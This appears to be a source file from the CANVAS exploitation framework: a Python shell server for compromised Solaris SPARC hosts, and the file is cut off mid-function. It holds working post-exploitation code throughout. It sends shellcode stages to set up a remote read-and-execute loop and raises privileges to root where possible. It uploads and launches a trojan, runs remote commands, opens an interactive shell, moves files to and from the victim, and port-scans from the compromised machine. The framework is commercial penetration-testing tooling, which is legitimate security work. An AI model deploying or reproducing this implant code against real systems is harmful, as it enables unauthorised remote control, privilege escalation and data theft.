#! /usr/bin/env python

"""
CANVAS solaris shell server
Uses MOSDEF for dynmanic assembly component linking

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


from shellserver import unixshellserver
from MOSDEFShellServer import MosdefShellServer, MSSgeneric
from MOSDEF import GetMOSDEFlibc
from exploitutils import *
import time
import os
import socket
import copy
import struct

from shellcode import shellcodeGenerator

#globals for solaris
O_RDONLY=0
O_RDWR=2
O_CREAT=0x100
O_TRUNC=0x200

SIG_DFL=0
SIG_IGN=1
SIGCHLD=18
SIGPIPE=13

# this is still used from the MOSDEF old_? attribute generator, do not rip out :>

from MOSDEF.solarisremoteresolver import solarisremoteresolver
class old_solarisshellserver(MSSgeneric, unixshellserver, solarisremoteresolver):
     """
     this is the solaris MOSDEF Shell Server class
     """
     def __init__(self, connection, node, logfunction=None, proctype='sparc'):
          solarisremoteresolver.__init__(self, proctype, '2.7') # to satisfy new layout
          unixshellserver.__init__(self,connection,logfunction=logfunction)
          MSSgeneric.__init__(self, proctype)
          self.libraryDict = {}
          self.functionDict = {}
          self.order = big_order
          self.unorder = str2bigendian
          self.node = node
          self.node.shell = self
          self.started = 0
     
     def setListenPort(self,port):
          self.listenport = port
          return
   
     def getASMDefines(self):
          return ""
    
     def assemble(self,code):
          return ""

         
     def startup(self):
          """
          this function is called by the engine and by self.run()
          we are ready to rock!
          Our stage one shellcode just reads in a word, then reads in that much data
          and executes it
          First we send some shellcode to get the socket register
          Then we send some shellcode to establish our looping server
          """
          if self.started:
               return 0
         
          self.connection.set_timeout(20)          
          sc = shellcodeGenerator.solarisSparc()
          sc.addAttr("sendreg", {"fdreg":"%g4", "regtosend":"%g4"})
          sc.addAttr("RecvExec",None)
          getfd = sc.get()

          self.sendrequest(getfd)
          
          #sometimes we get here, but our socket isn't really a MOSDEF shellcode
          #so here we do some simple error detection to avoid any problems later on
          try:
               data=self.connection.recv(4)
               if len(data)!=4:
                    self.log("Did not get 4 bytes from remote server!")
                    return 0
               self.log("data from remote side: %s"%prettyhexprint(data))
               self.fd = self.unorder(data)
          except timeoutsocket.Timeout:
               devlog("Solaris", "not started up, sorry")
               return 0
          self.leave()

          self.log("Self.fd: %d"%self.fd)

          # replaces the old initLocalFunctions mess (for solaris at least, port around)
          self.libc.initStaticFunctions({'fd': self.fd})
          self.libc.initPlatformStaticFunctions(self.fd)
          self.libc.initArchStaticFunctions(self.fd)

          # update local copy of localfunctions for node with new fd values
          self.localfunctions = copy.deepcopy(self.libc.localfunctions)

          self.log("Initialized Local Functions.")

          sc = shellcodeGenerator.solarisSparc()
          sc.addAttr("read_and_exec_loop",{"fd":self.fd})
          sc.addAttr("exit",None)
          mainloop = sc.get()        
          self.log("mainloop length=%d"%len(mainloop))
          self.sendrequest(mainloop)
          self.leave()
          # allow some time for mainloop to init
          snooze = 3
          while snooze:
               time.sleep(1)
               print "Snoozing... (%d)"%(snooze-1)
               snooze -= 1

          # ok, now our mainloop code is running over on the other side
          self.log("Set up Solaris SPARC dynamic linking assembly component server")

          self.log("Resetting signal handlers...")
          self.signal(SIGCHLD, SIG_DFL)
          self.log("Reset sigchild")
          self.signal(SIGPIPE, SIG_IGN)
          self.log("Reset sigpipe")

          self.log("Getting UIDs");
          (uid,euid,gid,egid) = self.ids()

          if euid != 0 and uid == 0:
               self.log("Setting euid to 0...")
               self.seteuid(0)

          #connection is blocking and we should not timeout here.
          self.connection.set_timeout(None)          
          
          self.setInfo("Solaris MOSDEF ShellServer. Remote host: %s"%("*"+str(self.getRemoteHost())+"*"))
          self.setProgress(100)
          self.started = 1
          return 1
    
     def run(self):
          """
          Placeholder
          """
          
          return


     def uploadtrojan(self):
          didtrojan=0
          for file in testfiles:
               print "trying to create %s"%(file)
               newfile=self.lcreat(file)
               if sint32(newfile)==-1:
                    continue
               print "Success"
               #otherwise, we were able to open the file! YAY!
               tFile=open(trojanfile,"r")
               alldata=tFile.read()
               tFile.close()
               print "Trying to write into that file"
               while alldata!="":
                    self.write(newfile,alldata[:1000])
                    alldata=alldata[1000:]

               print "Done writing, now closing file"
               #close our remote file
               self.close(newfile)
               print "Now spawning file"
               self.spawn(file)
               #self.spawn(file)
               self.log("Done spawning file!")
               didtrojan=1
               break

          if not didtrojan:
               self.log("Didn't do trojan...sorry")

          return

     def pwd(self):
          """
          calls getcwd()
          """
          ####TODO
          ret=self.getcwd()
          return ret
    
     def tcpportscan(self,args):
          """ TCP Connect scan from the remote host.
          Args: network to scan, startport, endport
          """
          argsL=args.split(" ")
          return self.tcpConnectScan(argsL[0],int(argsL[1]),int(argsL[2]))
     
     def upload(self, source, dest="", destfilename = None):
          """ Upload a file to the remote host """
          try:
               tFile = open(source,"r")
               alldata = tFile.read()
               tFile.close()
          except:
               return "Error reading input file, sorry."
          if destfilename and dest != "":
               destfile = dest + "/" + destfilename
          else:
               # XXX: when you're trying to upload /etc/passwd
               # XXX: it needs to strip the path !
               destfile = dest + source.split(os.path.sep)[-1]
               #destfile = dest+source
          print "trying to create %s"%(destfile)

          newfile=self.open(destfile, O_RDWR|O_CREAT|O_TRUNC)
          if sint32(newfile)<0:
               self.log("Error: %X"% newfile)
               return "Could not create remote file!"
          #now write the data directly down the pipe
          self.writetofd(newfile,alldata)
          ret=self.close(newfile)
          if sint32(ret)==-1:
               return "Couldn't close file, that's weird - possibly some kind of error."
          ret="Uploaded file successfully"
          return ret

     def download(self,source,dest="."):
          """
          downloads a file from the remote server
          """
          dest = dest + source.replace("/", "_")
          infile = self.open(source, O_RDONLY )
          if infile < 0:
               self.log("Error: %s"%self.perror(infile))
               return "Couldn't open remote file %s, sorry."%source
          if os.path.isdir(dest):
               dest = os.path.join(dest, source)
          ret, fs = self.fstat(infile)
          if ret != 0:
               #self.log("Ret %s"%ret)
               self.log("Error: %s"%self.perror(infile))
               self.close(infile)
               return "fstat failed on file %s"%source
          #print "%s"%fs
          size=fs["st_size"]
          self.log("Downloading %s bytes"%size)
          
          outfile = open(dest,"wb")
          if outfile == None:
               return "Couldn't open local file %s"%dest
          self.log("infile = %8.8x" % infile)
          data="A"
          #this is going to fill up all of RAM with large files,
          #and needs to be fixed
          print "[!] reading data from remote fd"
          data = self.readfromfd(infile, size)
          outfile.write(data)
          ret=self.close(infile)
          if sint32(ret) < 0:
               self.log("Some kind of error closing fd %d"% infile)
          outfile.close() #close local file
          return "Read %d bytes of data into %s"%(len(data),dest)

     def cd(self,dest):
          if sint32(self.chdir(dest))==-1:
               return "No such directory, drive, or no permissions to access that directory."
          return "Successfully changed to %s"%(dest)
     
     def dounlink(self,filename):
          ret=self.unlink(filename)
          if not ret:
               return "%s was unlinked."%filename
          else:
               return "%s was not unlinked due to some kind of error."%filename
       
     def dospawn(self,filename):
          return "%s was not spawned, not implemented on solarisNode yet."%filename
        
     def runcommand(self,command):
          """
          Runs a command via popen
          """
          data=""
          data=self.popen2(command)
          return data

     def runexitprocess(self):
          """Exit the process"""
          self.exit(1)
          return "Exited the process"

     def callzero(self):
          """call zero
          This will cause the remote server to cause an exception
          """
          print "CALLING 0"
          #call 0 to cause an exception
          self.sendrequest(intel_order(0))
          self.shutdown()
          self.leave()
          print "Done calling zero"
        
     def shutdown(self):
          """
          close the socket
          """
          #close connection
          self.connection.close()
          return
   
        
     #################################################################################################
     #Shellcode functions below
   
     def getids(self):
          uid,euid,gid,egid=self.ids()
          return "UID=%d EUID=%d GID=%d EGID=%d"%(uid,euid,gid,egid)
     
     def signal(self,signum,action):
          """
          Calls signal to get the signal handler set
          """
          vars={}
          vars["signum"]=signum
          vars["sighandler"]=action
          self.clearfunctioncache()
          request=self.compile("""
          #import "local","sendint" as "sendint"
          #import "int", "signum" as "signum"
          #import "int", "sighandler" as "sighandler"
          #import "local", "signal" as "signal"
          
          void main() 
          {
            int i;
            i=signal(signum,sighandler);
            sendint(i);
           }
          """,vars)
          self.sendrequest(request)
          ret=self.readint()
          #print "Ret=%s"%ret
          self.leave()
          return ret

     def getcwd(self):
          """
          inputs: none
          outputs: returns the current working directory as a string
          """
          #Solaris Notes
          #first call pathconf with "." and 5 as the arguments to get max size
          #urg- this is the algo they use on solaris to "implement" getcwd()"
          #They do a fstat on / and a fstat on . and then getdents to walk ../../.. ...
          #until the device numbers are different or they are in /
          #Amazingly lame.
          #we're just going to use popen() to emulate that. :>          
          #normally this would work, but it doesn't because of how fun solaris is.
          ret=self.popen2("pwd").strip()
          return ret
     
     def fstat(self,infd):
          """
          runs fstat
          """

          vars={}
          vars["fd"]=infd
          code="""
          #include "fstat.h"
          #import "local","sendint" as "sendint"
          #import "local","sendshort" as "sendshort"
          #import "local","fstat" as "fstat"
          #import "int", "fd" as "fd"

          void main()
          {
               struct stat buf;
               int ret;
               
               ret = fstat(fd, &buf);
               sendint(ret);
               if (ret==0) 
               {
                   // XXX: sendshort uses write(2)
                   // XXX: sendint uses send(2)
                   sendshort(buf.st_dev);
                   sendint(buf.st_ino);
                   sendshort(buf.st_mode);
                   sendshort(buf.st_nlink);
                   sendshort(buf.st_uid);
                   sendshort(buf.st_gid);
                   sendshort(buf.st_rdev);
                   sendint(buf.st_size);
                   sendint(buf.st_blksize);
                   sendint(buf.st_blocks);
                   sendint(buf.st_atime);
                   sendint(buf.st_mtime);
                   sendint(buf.st_ctime);
               }

               return;
          }
          """
          self.clearfunctioncache()
          request=self.compile(code,vars)
          self.sendrequest(request)
          ret=self.readint()
          statbuf=None
          if ret==0:
               #success
               statbuf=self.readstruct([("s","st_dev"),
                                        ("l","st_ino"),
                                        ("s","st_mode"),
                                        ("s","st_nlink"),
                                        ("s","st_uid"),
                                        ("s","st_gid"),
                                        ("s","st_rdev"),
                                        ("l","st_size"),
                                        ("l","st_blksize"),
                                        ("l","st_blocks"),
                                        ("l","st_atime"),
                                        ("l","st_mtime"),
                                        ("l","st_ctime")])
                                        

          #print "Ret=%s"%ret
          self.leave()
          return ret,statbuf
     
     
     def fexec(self,command,args,env):
          """
          calls fork execve
          """

          vars = self.libc.getdefines()
          vars["command"]=command
          code=""
          i=0
          for a in args:
               vars["arg%d"%i]=a
               code+="#import \"string\",\"arg%d\" as \"arg%d\""%(i,i)
               i+=1
          i=0
          for e in env:
               vars["env%d"%i]=e
               code+="#import \"string\",\"env%d\" as \"env%d\""%(i,i)
               i+=1
          maxargs=len(args)
          maxenv=len(env)
          
          code+="""
          //start
#include <unistd.h>
#include <string.h>
#import "local", "wait" as "wait"
//#import "local", "debug" as "debug"

#import "string", "command" as "command"



void main()
{
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[ARGVNUM];
          char *envp[ENVNUM];
          int ret;
          int pid;
          int ppid;

          //pipes[0] is now for reading and pipes[1] for writing

          """
          code=code.replace("ARGVNUM",str(maxargs+1))
          code=code.replace("ENVNUM",str(maxenv+1))
          code+="envp[%d]=0;\n"%maxenv
          code+="argv[%d]=0;\n"%maxargs
          for i in range(0,maxargs):
               code+="argv[%d]=arg%d;\n"%(i,i)
          for i in range(0,maxenv):
               code+="envp[%d]=env%d;\n"%(i,i)
          code+="""
           //now we fork and exec and read from the socket until we are done
           ppid = getpid();
           pid=fork();
           //solaris fork(2) syscall returns parent id in child and child id in parent
           if (pid==ppid) 
           {
              //child
              close(1);
              close(2);
              execve(command,argv,envp);
              _exit(1); //in case it failed
           }
           
           //we do this twice in the event that 
           //our previous process did not exit by now...
           //we could listen for pid, but instead, we listen for any process
           //that is a zombie
           wait(0); //wnohang is 1
           wait(0); //wnohang is 1
           }
       
           """
          self.clearfunctioncache()          
          request=self.compile(code,vars)
          self.sendrequest(request)
          self.leave()     
          return
                    
     def spawn(self, command):
          """
          fork() + execve()
          """
          devlog("solaris", "Spawning %s"%command)
          vars = self.libc.getdefines()
          vars["command"]=command
          code="""
            
          //start
          #include <unistd.h>
          #include <string.h>
          
          #import "string","command" as "command"
          void main()
          {
          char *argv[4];
          char **envp;
          int pid;
          int ppid;
          
          envp=0;
          argv[0]="/bin/sh";
          argv[1]="-c";
          argv[2]=command;
          argv[3]=0;
   
          ppid = getpid();
          //fork(2) syscall returns parent id in child and child id in parent
          pid = fork();
          if (pid==ppid) 
          {
             //child
             execve("/bin/sh",argv,envp);
             _exit(1); //in case it failed
          }
          wait(0); //wnohang is 1
        }
          """
          self.clearfunctioncache()          
          request=self.compile(code,vars)
          self.sendrequest(request)
          self.leave()
          devlog("solaris", "Spawn completed!")
          return 
     
     def popen2(self,command):
          """
          runs a command and returns the result
          Note how it uses TCP's natural buffering, and 
          doesn't require a ping-pong like protocol.
          """

          vars = self.libc.getdefines()
          vars["command"]=command
          vars["shell"]="/bin/sh"
          vars["dashc"]="-c"
          code="""
          //start
#include <unistd.h>
#include <string.h>

#import "string","command" as "command"
#import "string","dashc" as "dashc"
#import "string","shell" as "shell"

#import "local", "wait" as "wait"
#import "local", "pipe" as "pipe"
//#import "local", "debug" as "debug"
#import "local", "sendstring" as "sendstring"


void main()
{
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[4];
          char **envp;
          int ret;
          int pid;
          int ppid;
          
          //pipes[0] is now for reading and pipes[1] for writing

          envp=0;
          argv[0]=shell;
          argv[1]=dashc;
          argv[2]=command;
          argv[3]=0;
          
           //now we fork and exec and read from the socket until we are done
           ret=pipe(pipes);
           ret=pipe(bpipes);
           //debug();
           ppid = getpid();
           //fork(2) syscall returns parent id in child and child id in parent
           pid = fork();
           if (pid==ppid) 
           {
              //child
              close(0);
              close(1);
              close(2);
              ret=dup2(pipes[0],0);
              ret=dup2(bpipes[1],1);
              ret=dup2(bpipes[1],2);
              close(bpipes[0]);
              execve(shell,argv,envp);
              _exit(1); //in case it failed
           }
           ret=close(bpipes[1]);
           ret=close(pipes[0]);
           memset(buf,0,1001);
           //debug();           
           while (read(bpipes[0],buf,1000)!=0) {
              sendstring(buf);
              memset(buf,0,1001);
           }
           //debug();
           //send blank string...
           sendstring(buf);
           close(pipes[1]);
           close(bpipes[0]);
           //we do this twice in the event that 
           //our previous process did not exit by now...
           //we could listen for pid, but instead, we listen for any process
           //that is a zombie
           wait(0); //wnohang is 1
           wait(0); //wnohang is 1
           }
       
           """
          self.clearfunctioncache()          
          request=self.compile(code,vars)
          self.sendrequest(request)
          tmp=self.readstring()
          data=[tmp]
          while tmp!="":
               tmp=self.readstring()
               data+=[tmp]
          data="".join(data)
          self.leave()
          return data

     def shellshock(self, logfile=None):
          """implements an interactive shell, reverts back to MOSDEF on \'exit\'"""

          vars = self.libc.getdefines()
          vars["shell"]="/bin/sh"
          vars["dashi"]="-i"
          vars["mosdefd"]=self.fd

          code="""
#include <sys/poll.h>
#include <unistd.h>
#include <string.h>

#import "string", "dashi" as "dashi"
#import "string", "shell" as "shell"
#import "int", "mosdefd" as "mosdefd"

#import "local", "sendstring" as "sendstring"
#import "local", "sendint" as "sendint"

//struct pollfd {
//  int fd;
//  short events;
//  short revents;
//};

void main()
{
  char *exec[3];
  char in[512];
  char out[512];

  int pid;
  int ppid;
  int rfd;
  int wfd;
  int len;
  int ret;

  int error;

  int i;


  // cuz we're lacking proper struct array support
  int ufds[4];

  int moscheck;
  int shellcheck;

  int write_pipe[2];
  int read_pipe[2];

  exec[0] = shell;
  exec[1] = dashi;
  exec[2] = 0;

  pipe(write_pipe);
  pipe(read_pipe);

  ppid = getpid();
  pid = fork();

  if (pid == ppid)
  {
    close(0);
    close(1);
    close(2);
    dup2(write_pipe[0], 0);
    dup2(read_pipe[1], 1);
    dup2(read_pipe[1], 2);
    close(read_pipe[0]);
    execve(exec[0], exec, 0);
    _exit(1);
  }

  //debug();

  close(read_pipe[1]);
  close(write_pipe[0]);

  rfd = read_pipe[0];
  wfd = write_pipe[1];

  error = 0;

  while (error == 0)
  {

    // SPARC SPECIFIC ORDERING .. XXX .. DUE TO LACK OF STRUCT ARRAY SUPPORT

    ufds[0] = rfd;
    ufds[1] = 0x00400000;
    ufds[2] = mosdefd;
    ufds[3] = 0x00400000;
    
    ret = poll(&ufds, 2, -1);
    if (ret > 0)
    {

      shellcheck = ufds[1] & 0x0040; // checks the low word == pollfd.revents ..
      if (shellcheck == 0x0040)
      {
        memset(&in, 0, 512);
        len = read(rfd, in, 511);
        if (len > 0)
        {
          sendstring(in);
        }
        else
        {
          sendint(0);
          error = 1;
        }
      }
      // check for POLLERR | POLLHUP | POLLNVAL in revents
      shellcheck = ufds[1] & 0x0038;
      if (shellcheck != 0)
      {
        sendint(0);
        error = 1;
      }

      moscheck = ufds[3] & 0x0040; 
      if (moscheck == 0x0040)
      {
        memset(&out, 0, 512);
        len = read(mosdefd, out, 511);
        if (len > 0)
        {
          write(wfd, out, len);
        }
        else
        {
          sendint(0);
          error = 1;
        }
      }
      // check for POLLERR | POLLHUP | POLLNVAL in revents
      moscheck = ufds[3] & 0x0038;
      if (moscheck != 0)
      {
        sendint(0);
        error = 1;
      }
    }
  }
  return;
}
          """
          self.clearfunctioncache()
          request=self.compile(code,vars)
          self.sendrequest(request)

          ret = self.shellshock_loop(endian="big", logfile=logfile)

          self.leave()
          return

     
     def readfromfd(self,fd,filesize):
          """ Reads from a open fd on the remote host """

          vars={}
          vars["bufsize"]=filesize
          vars["socketfd"]=self.fd
          vars["filefd"]=fd
          code="""
          #import "local", "read" as "read"
          #import "local", "writeblock" as "writeblock"
          //#import "local", "debug" as "debug"
          #import "int", "bufsize" as "bufsize"
          #import "int", "socketfd" as "socketfd"
          #import "int", "filefd" as "filefd"

          void main () {
          char buf[1001];
          int left;

          left=bufsize;
           //debug();
           while (left>1000) {
            read(filefd,buf,1000); 
            writeblock(socketfd,buf,1000);
            left=left-1000;
           }
           
           if (left>0) {
            read(filefd,buf,left); 
            writeblock(socketfd,buf,left);
           }
          
          }
          """
          self.clearfunctioncache()
          request=self.compile(code,vars)
          self.sendrequest(request)
          data=self.readbuf(filesize)
          self.leave()
          return data

     def writetofd(self,fd,data):
          """
          Writes all the data in data to fd
          """

          vars={}
          vars["bufsize"]=len(data)
          vars["socketfd"]=self.fd
          vars["filefd"]=fd
          
          code="""
          #import "local", "readblock" as "readblock"
          #import "local", "write" as "write"
          //#import "local", "debug" as "debug"
          #import "int", "bufsize" as "bufsize"
          #import "int", "socketfd" as "socketfd"
          #import "int", "filefd" as "filefd"

          void main () {
          char buf[1001];
          int left;

           left=bufsize;
           //debug();
           while (left>1000) {
            readblock(socketfd,buf,1000); 
            write(filefd,buf,1000);
            left=left-1000;
           }
           
           if (left>0) {
            readblock(socketfd,buf,left); 
            write(filefd,buf,left);
           }
          }
          """
          self.clearfunctioncache()
          request=self.compile(code,vars)
          self.sendrequest(request)
          self.writebuf(data)
          self.leave()
          return
     
     def setblocking(self,fd,blocking):
          code="""
          #import "local", "fcntl" as "fcntl"
          #import "int", "O_NONBLOCK" as "O_NONBLOCK"
          #import "int", "O_BLOCK" as "O_BLOCK"
          #import "int", "sock" as "sock"
          #import "int", "F_SETFL" as "F_SETFL"
          #import "int", "F_GETFL" as "F_GETFL"

          void main() {
          int opts;
          
          opts=fcntl(sock,F_GETFL,0); //MOSDEF uses a null arg
          """
          if blocking:
               #set blocking by clearing the nonblocking flag
               code+="opts=opts & O_BLOCK;\n"
          else:
               #set nonblocking
               code+="opts=opts | O_NONBLOCK;\n"
          code+="""
          fcntl(sock,F_SETFL,opts);
          }
          """
          vars = self.libc.getdefines()
          vars["sock"]=fd
          self.clearfunctioncache()
          message=self.compile(code,vars)
          self.sendrequest(message)
          self.leave()
          return
     
     def setsockopt(self,fd,option,arg):
          code="""
          #import "local", "setsockopt" as "setsockopt"
          #import "int","arg" as "arg"
          #import "int","option" as "option"
          #import "int","level" as "level"
          #import "int", "sock" as "sock"

          void main() 
          {
            setsockopt(sock, level, option, arg);
          }
          """
          vars = self.libc.getdefines()
          vars["option"]=option
          vars["arg"]=arg
          vars["sock"]=fd
          vars["level"] = vars['SOL_SOCKET']
          self.clearfunctioncache()
          message = self.compile(code,vars)
          self.sendrequest(message)
          self.leave()
          return
     
     def getrecvcode(self,fd,length):
          devlog('shellserver::getrecvcode', "Creating recv code for fd %d of length %d" % (fd, length))
          code="""
          #import "local", "recv" as "recv"
          #import "local", "writeblock2self" as "writeblock2self"
          #import "int", "length" as "length"
          #import "int", "fd" as "fd"
          
          void main() 
          {
            int i;
            char buf[1000];
            int wanted;
            //flags set to zero here
            wanted=length;
            while (wanted > 0 ) {
             if (wanted < 1000) {
               i=recv(fd,buf,wanted,0);
             }
             else
             {
              i=recv(fd,buf,1000,0);
             }
             if (i<0)
               {
                writeblock2self(buf,0); 
                wanted=0;
               }
             else 
             {
              writeblock2self(buf,i);
              wanted=wanted-i;
             }
              
            }
          }
          """
          vars={}
          vars["fd"]=fd
          vars["length"]=int(length)
          self.clearfunctioncache()
          message=self.compile(code,vars)
          return message
     
     def recv(self,fd, length):
          """
          reliable recv from socket
          """
          print "Recieving %d bytes from fd %d"%(length,fd)
          message=self.getrecvcode(fd,length)
          self.sendrequest(message)
          gotlength=0
          ret=[]
          #reliable recv
          buffer=self.node.parentnode.recv(self.connection,length)
          #print "Got %d: %s"%(len(buffer),prettyprint(buffer))
          self.leave()
          return buffer
     
     def recv_lazy(self,fd,timeout=None,length=1000):
          """Get whatever is there"""
          #print "In recv_lazy fd=%d"%fd
          if timeout==None:
               timeout=0 #immediately return
          if length > 1000:
               length=1000
           
          #print "LENGTH SET TO: %d"%length
    
          code="""
          #import "local", "recv" as "recv"
          #import "local", "sendblock2self" as "sendblock2self"
          #import "int", "fd" as "fd"
          #import "int", "timeout" as "timeout"
          #import "int", "length" as "length"
          #import "local", "poll" as "poll"
          
          struct pollfd {
            int fd;     
            short events;
            short revents;
          };

          void main() 
          {
            int i;
            char buf[1000];
            int r;
            struct pollfd ufds;
            
            ufds.fd = fd;

//#define POLLIN          0x0001          /* fd is readable */
//#define POLLPRI         0x0002          /* high priority info at fd */
//#define POLLOUT         0x0004          /* fd is writeable (won't block) */
//#define POLLRDNORM      0x0040          /* normal data is readable */

            ufds.events = 0x0001;
            ufds.revents = 0x0000;
            //timeout is in ms
            i = poll(&ufds,1,timeout);
            r = ufds.revents & 0x0001;
            if (r > 0) {
              i=recv(fd, buf, length, 0);
            } 
            else
            {
             i = -1;
            }
            if (i < 0)
            {
            //we use send because we have no idea how much we're recieving
              sendblock2self(buf, 0); 
            }
            else 
            {
              sendblock2self(buf, i);
            }
          }
          """    
          vars={}
          vars["fd"]=fd
          # miliseconds
          vars["timeout"]=timeout
          vars["length"]=length
          self.clearfunctioncache()
          message=self.compile(code,vars)
          self.sendrequest(message)
          devlog('MOSDEFSock::readblock', "Before readblock")
          buffer=self.readblock()
          devlog('MOSDEFSock::readblock', "After readblock")
          self.leave()
          return buffer
     
     def accept(self,fd):
          code="""
          #import "local", "accept" as "accept"
          #import "int", "fd" as "fd"
          #import "local", "sendint" as "sendint"
          #include "socket.h"

          void main()
          {
            int i;
            struct sockaddr_in sa;
            int len;

            len = 16;
            i = accept(fd, &sa, &len);
            sendint(i);
            sendint(sa.addr);
          }
          """
          vars={}
          vars["fd"]=fd
          self.clearfunctioncache()
          message=self.compile(code,vars)
          self.sendrequest(message)
          ret=sint32(self.readint())
          addr=self.readint()
          self.leave()
          return ret

     def getsendcode(self,fd,buffer):
          """Reliable send to socket, returns a shellcode for use by Node and self"""
          devlog('shellserver::getsendcode', "Sending %d bytes to fd %d" % (len(buffer), fd))
          code="""
          #import "int", "length" as "length"
          #import "int", "fd" as "fd"
          #import "string", "buffer" as "buffer"
          #import "local", "send" as "send"
          void main() 
          {
            int i;
            char *p;
            int wanted;
            wanted=length;
            p=buffer;
            while (wanted > 0 ) {
            i=send(fd,p,wanted,0); // flags set to zero here
            if (i<0) {
              wanted=0; 
             }
             wanted=wanted-i;
             p=p+i;
            }
          }
          """
          vars={}
          vars["fd"]=fd
          vars["length"]=len(buffer)
          vars["buffer"]=buffer
          self.clearfunctioncache()
          message=self.compile(code,vars)
          return message

     def send(self,fd,buffer):
          """
          reliable send to socket
          """
          message=self.getsendcode(fd,buffer)
          self.sendrequest(message)
          self.leave()
          return 

     def socket(self,proto):
          """
          calls socket and returns a file descriptor or -1 on failure.
          """
          code="""
          #import "int", "AF_INET" as "AF_INET"
          #import "int", "proto" as "proto"
          #include "socket.h"
          #import "local", "socket" as "socket"
          #import "local", "sendint" as "sendint"
 
          void main()
          {
             int i;
             i=socket(AF_INET,proto,0);
             sendint(i);
          }
          """
          if proto.lower()=="tcp":
              proto=self.libc.getdefine('SOCK_STREAM')
          elif proto.lower()=="udp":
              proto=self.libc.getdefine('SOCK_DGRAM')
          else:
              print "Don't know anything about protocol %s in socket()"%proto
              return -1

          vars = self.libc.getdefines()
          vars["proto"]=proto

          self.clearfunctioncache()
          message = self.compile(code, vars)
          self.sendrequest(message)
          ret = self.readint()
          self.leave()
          return ret

     def connect(self,fd,host,port,proto,timeout):
          if proto.lower()=="tcp":
               proto=self.libc.getdefine('SOCK_STREAM')
          elif proto.lower()=="udp":
               proto=self.libc.getdefine('SOCK_DGRAM')
          else:
               print "Protocol not recognized"
               return -1
          return self.connect_sock(fd,host,port,proto,timeout)
     
     def connect_sock(self,fd,host,port,proto,timeout):
          """
          Does a tcp connect with a timeout
          """
          code="""
         #import "int", "AF_INET" as "AF_INET"
         #import "int", "SOL_SOCKET" as "SOL_SOCKET"
         #import "int", "SO_ERROR" as "SO_ERROR"
         #import "int", "ip" as "ip"
         #import "int", "port" as "port"
         #import "int", "proto" as "proto"
         #import "int", "sockfd" as "sockfd"
         #import "int", "timeout" as "timeout"
         #include "socket.h"
         #import "local", "connect" as "connect"
         #import "local", "close" as "close"
         #import "local", "socket" as "socket"
         #import "local", "sendint" as "sendint"
         #import "local", "poll" as "poll"
         #import "local", "memset" as "memset"
         //#import "local", "debug" as "debug"
         #import "int", "F_SETFL" as "F_SETFL"
         #import "int", "F_GETFL" as "F_GETFL"
         #import "local", "fcntl" as "fcntl"
         #import "int", "O_NONBLOCK" as "O_NONBLOCK"
         #import "int", "O_BLOCK" as "O_BLOCK"
         #import "local", "getsockopt" as "getsockopt"

         struct pollfd {
             int fd;
             short events;
             short revents;
         };

         int
         main()
         {
           int i;
           int ret;
           int ilen;
           int sockopt;
           int opts;

           struct sockaddr_in serv_addr;
           struct pollfd ufd;

           //sockfd is set on MOSDEFSock init
           //sockfd=socket(AF_INET,SOCK_STREAM,0);

           //debug();
           serv_addr.family=AF_INET;
           // solaris byte ordering is already byte ordered correctly :P 
           serv_addr.port = port;
           serv_addr.addr = ip; 

           // set to non-blocking
           opts=fcntl(sockfd, F_GETFL, 0);
           opts=opts | O_NONBLOCK;
           fcntl(sockfd, F_SETFL, opts); 

           // errno is in %o0, sooo we check directly for return value == to errno
           // just a semantic due to us doing direct so_socket libc ;) ill implement
           // a proper errno mechanism some other heezy, for now i make our syscalls
           // negate the errno so we have linux style errno and we don't have to change
           // every < 0 return check ;)

           //debug();
           ret = connect(sockfd, &serv_addr, 16);
           if (ret < 0) {
               // EINPROGRESS 
               if (ret == -150) {
                   ufd.fd = sockfd;
                   //requested events shorts
//#define POLLIN          0x0001          /* fd is readable */
//#define POLLPRI         0x0002          /* high priority info at fd */
//#define POLLOUT         0x0004          /* fd is writeable (won't block) */
//#define POLLRDNORM      0x0040          /* normal data is readable */

                   ufd.events = 0x0004;
                   ufd.revents = 0x0000;
                   //debug();
                   i=poll(&ufd, 1, timeout);
                   if (i > 0) {
                        sockopt = 0;
                        ilen = 4;
                        // another possibility would be to check for getpeername() returning 0
                        // if that's the case, the socket is connected, would be more portable
                        // than getsockopt (are we doing THAT ancient?)
                        getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &sockopt, &ilen);
                        if (sockopt) {
                            // error occurred on socket
                            sendint(-1);
                            return;
                        }
                   }
                   // timeout or error
                   else {
                        sendint(-2);
                        return;
                   }
               }
               // some other errno was set
               else {
                   sendint(-1);
                   return;

               }
           }

           // connect (with timeout) succeeded
 
           // set back to blocking
           opts = fcntl(sockfd, F_GETFL, 0);
           opts = opts & O_BLOCK;
           fcntl(sockfd, F_SETFL, opts);
 
           sendint(0);
        }
          """

          ip = socket.gethostbyname(host) #resolve from remotehost
          vars = self.libc.getdefines()

          #vars["ip"] = socket.htonl(struct.unpack('!L', socket.inet_aton(ip))[0])

          vars["ip"] = str2bigendian(socket.inet_aton(ip))
          vars["port"] = port

          vars["proto"] = proto
          vars["sockfd"] = fd
          vars["timeout"] = timeout*1000 # miliseconds

          self.clearfunctioncache()
          message = self.compile(code,vars)
          self.sendrequest(message)
          ret = self.readint()
          self.leave()
          return ret
          
     def getListenSock(self,addr,port):
          """
          Creates a tcp listener socket fd on a port
          """
          code="""
          #import "local", "bind" as "bind"
          #import "local", "listen" as "listen"
          #import "local", "socket" as "socket"
          #import "local", "sendint" as "sendint"
          #import "int", "addr" as "addr"
          #import "int", "port" as "port"
          #import "int", "AF_INET" as "AF_INET"
          #import "int", "SOCK_STREAM" as "SOCK_STREAM"
          #include "socket.h"
          
          void main()
          {
            int sockfd;
            int i;
            struct sockaddr_in serv_addr;
            
            serv_addr.family = AF_INET;
            
            sockfd = socket(AF_INET, SOCK_STREAM, 0);
            serv_addr.port = port;
            serv_addr.addr = addr;

            // remember we get errno as minus return val .. so we have to check < 0 .. not -1

            i = bind(sockfd, &serv_addr, 16);
            if (i < 0)
            {
              sendint(-1); // bind failed
              return;
            }

            i = listen(sockfd, 16);
            if (i < 0)
            {
              sendint(-2); // listen failed
              return;
            }
                
            sendint(sockfd); //success
          }
          """
          vars = self.libc.getdefines()

          vars["port"] = port
          #vars["addr"] = socket.htonl(struct.unpack('!L', socket.inet_aton(addr))[0])
